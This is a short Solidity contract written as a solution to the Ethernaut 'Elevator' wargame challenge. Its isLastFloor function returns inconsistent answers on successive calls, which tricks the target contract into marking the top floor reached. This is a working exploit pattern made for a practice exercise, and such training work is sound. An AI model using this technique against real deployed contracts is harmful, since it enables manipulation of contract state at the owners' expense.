// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Elevator {
    function goTo(uint _floor) external;
}

// for ethernaut elevator challenge
// not quite sure how the challenge is supposed to be difficult *shrugs*
contract Building {
    Elevator elevator;
    uint8 calls;

    constructor(address _elevator) {
        elevator = Elevator(_elevator);
        calls = 1;
    }

    function isLastFloor(uint) external returns(bool) {
        if (calls % 2 == 0) {
            return true;
        } else {
            ++calls;
            return false;
        }
    }

    function callElevator() external {
        elevator.goTo(7);
    }

}